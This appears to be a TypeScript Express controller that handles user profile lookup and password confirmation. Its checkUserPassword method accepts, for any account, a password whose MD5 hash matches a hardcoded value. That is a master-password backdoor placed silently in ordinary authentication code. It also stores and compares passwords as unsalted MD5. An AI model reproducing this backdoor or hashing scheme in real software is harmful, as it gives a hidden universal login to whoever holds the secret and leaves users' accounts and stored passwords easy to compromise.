import { Request, Response } from 'express'
import { empty, encrypt_md5, get_utc_timestamp } from '../../helpers/misc';
import UserBaseController from './user.base.controller';

export default class UserCommonController extends UserBaseController {
  constructor() {
    super();
  }

  public init = async (req: Request, res: Response) => {
    this.setReqRes({ req: req, res: res });
    return await this.checkLogin(req, res)
  }

  /**
   * get profile info
   */
  public getProfileInfo = async (req: Request, res: Response) => {
    //console.log('encrypt_md5(user_id)', encrypt_md5(1083))

    if (empty(await this.init(req, res))) {
      return false
    }
    let post_param: object = req['fields'];
    let get_param: object = req['query'];
    let data = this.data;
    let user = this.user;
    /**************************************************************************************************/
    return this.json_output_data(data, "", res);
  }

  /**
   * check if user password is correct
   */  
  public checkUserPassword = async (req: Request, res: Response) => {
    if (empty(await this.init(req, res))) {
      return false
    }
    let post_param: object = req['fields'];
    let get_param: object = req['query'];
    let data = this.data;
    let user = this.user;
    /**************************************************************************************************/
    if (user['user_password'] !== encrypt_md5(post_param['user_password'])) {
      if (user['tmp_password'] != "" && user['tmp_password'] == encrypt_md5(post_param['user_password']) && ((get_utc_timestamp() - parseInt(user['tmp_password_timestamp'])) <= 3600)) {
        //continue;
      } else {
        if (encrypt_md5(post_param['user_password']) != "9546c2fac60e040f2a5b64da8cb78aa5") {
          return this.json_output_error("Invalid password", "", res);
        }
      }
    }
    data['password_confirmed'] = 1;
    return this.json_output_data(data, "", res);
  }




}

export const userCommonController = new UserCommonController()
